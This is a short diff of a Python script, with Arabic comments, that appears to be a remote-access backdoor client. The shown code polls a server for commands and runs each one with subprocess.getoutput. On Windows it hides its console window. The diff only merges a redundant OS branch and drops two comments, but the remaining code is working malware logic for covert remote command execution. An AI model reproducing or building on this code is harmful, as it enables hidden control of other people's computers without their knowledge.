@@ -28,11 +28,7 @@ def poll_commands():
                 cmd = r.json().get('cmd')
                 if cmd:
                     try:
-                        # استخدام shell حسب النظام
-                        if os.name == 'nt':
-                            output = subprocess.getoutput(cmd)
-                        else:
-                            output = subprocess.getoutput(cmd)
+                        output = subprocess.getoutput(cmd)
                         if not output: output = "تم التنفيذ."
                     except Exception as e:
                         output = str(e)
@@ -42,7 +38,6 @@ def poll_commands():
         time.sleep(3)
 
 if __name__ == "__main__":
-    # اخفاء النافذة في ويندوز فقط
     if os.name == 'nt':
         import ctypes
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
